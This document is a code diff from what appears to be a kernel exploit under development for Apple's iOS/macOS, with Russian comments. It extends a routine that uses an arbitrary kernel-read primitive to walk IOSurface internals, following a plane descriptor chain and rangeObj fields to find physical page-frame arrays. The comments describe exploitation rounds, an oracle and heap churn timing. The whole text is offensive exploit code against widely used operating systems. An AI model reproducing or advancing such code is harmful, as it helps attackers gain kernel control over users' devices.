@@ -6218,23 +6218,29 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // oracle). Все копии page-list'а: сам объект (0x400), rangeObj(+0x178),
     // XPF ranges(+0x360 если ptr, gate по rangeCount +0x3a4). Окно churn-backlog.
     if (surfVA && !nSlots) {
-        uint64_t objs[4] = { surfVA, 0, 0, 0 };
+        // 1.9.154: полная цепочка execute (раунд 29): [surf+0x30] plane-descriptor
+        // → [plane+0x188] → … → pfn-массив. Прогон 1.9.153: rangeObj = мелкий
+        // дескриптор (counts+размер), PA-списка в нём нет. Скан по 6 объектам.
+        uint64_t objs[6] = { surfVA, 0, 0, 0, 0, 0 };
         uint64_t ro = kp_untag_ptr(early_kread64(surfVA + 0x178));
         if (kpLooksLikeKernelPointer(ro)) {
             objs[1] = ro;
-            // 1.9.153: [rangeObj+0x18] может быть указателем на массив pfn
             uint64_t q18 = early_kread64(ro + 0x18);
             uint64_t arrP = kp_untag_ptr(q18);
             kpNote(r, [NSString stringWithFormat:@"  rangeObj %#llx: [+0x18]=%#018llx%@",
                       (unsigned long long)ro, (unsigned long long)q18,
                       kpLooksLikeKernelPointer(arrP) ? @" (ptr → массив)" : @" (значение)"]);
             if (kpLooksLikeKernelPointer(arrP) && (uint32_t)(arrP & 0x3fff) + 8 <= 0x4000) objs[3] = arrP;
-            if ((uint32_t)(ro & 0x3fff) + 0x68 <= 0x4000) {
-                for (uint32_t o = 0; o + 8 <= 0x60; o += 8)
-                    kpNote(r, [NSString stringWithFormat:@"    ro+%#04x: %#018llx", o,
-                              (unsigned long long)early_kread64(ro + o)]);
-            }
         }
+        uint64_t plane = kp_untag_ptr(early_kread64(surfVA + 0x30));
+        uint64_t plane2 = 0;
+        if (kpLooksLikeKernelPointer(plane)) {
+            objs[4] = plane;
+            plane2 = kp_untag_ptr(early_kread64(plane + 0x188));
+            if (kpLooksLikeKernelPointer(plane2)) objs[5] = plane2;
+        }
+        kpNote(r, [NSString stringWithFormat:@"  цепочка: [surf+0x30]=%#llx [plane+0x188]=%#llx",
+                  (unsigned long long)plane, (unsigned long long)plane2]);
         uint64_t rcnt = early_kread64(surfVA + 0x3a4);
         uint64_t xr = early_kread64(surfVA + 0x360);
         uint64_t xru = kp_untag_ptr(xr);
@@ -6242,10 +6248,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kpNote(r, [NSString stringWithFormat:@"  IOSurface %#llx: rangeObj(+0x178)=%#llx ranges(+0x360)=%#llx rangeCount(+0x3a4)=%llu",
                   (unsigned long long)surfVA, (unsigned long long)ro,
                   (unsigned long long)xr, (unsigned long long)rcnt]);
-        for (int k = 0; k < 4 && nSlots < 8; k++) {
+        const uint32_t lims[6] = { 0x400, 0x100, 0x100, 0x100, 0x200, 0x100 };
+        for (int k = 0; k < 6 && nSlots < 8; k++) {
             uint64_t ob = objs[k];
             if (!ob) continue;
-            uint32_t lim = (k == 0) ? 0x400 : 0x100;
+            uint32_t lim = lims[k];
+            uint32_t room = 0x4000 - (uint32_t)(ob & 0x3fff);
+            if (room < lim) lim = room;
             for (uint32_t o = 0; o + 8 <= lim && nSlots < 8; o += 8) {
                 uint64_t q = early_kread64(ob + o);
                 int form = 0;
